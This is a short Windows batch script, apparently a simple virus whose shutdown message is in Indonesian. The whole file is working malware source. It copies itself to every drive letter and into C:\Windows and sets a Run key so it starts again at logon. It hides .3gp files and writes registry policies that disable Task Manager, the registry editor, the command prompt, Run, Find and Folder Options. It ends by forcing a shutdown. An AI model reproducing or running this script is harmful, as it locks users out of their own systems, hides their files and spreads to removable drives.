
Echo off > C:\virxx.txt
if no exist C:\Windows\%0 copy %0 C:\Windows
for %%p in (A C D E F G H) do copy %0 %%p:
for %%q in (A C D E F G H) do dir %%q:\*.3gp /B /S >> C:\virxx.txt
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind
/t REG_DWORD /d 1 /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v
DisableTaskMgr /t REG_DWORD /d 1 /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v
NoFolderOptions /t REG_DWORD /d 1 /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v
ShowSuperHiden /t REG_DWORD /d 0 /f
for %%r in (A C D E F G H) do attrib +h +s %%r:\*.3gp /s
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun
/t REG_DWORD /d 1 /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v gorun /t REG_SZ /d
C:\Windows\virxx.bat /f
REG ADD HKCU\Software\Policies\Microsoft\Windows\System DisableCMD /t REG_DWORD /d
2 /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v
NoViewOnDrive /t REG_DWORD /d 4 /f
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v
DisableRegedit /t REG_DWORD /d 1 /f
Shutdown -s -t 360 -c “Virus Menjangkiti Komputer Anda” -f
Exit
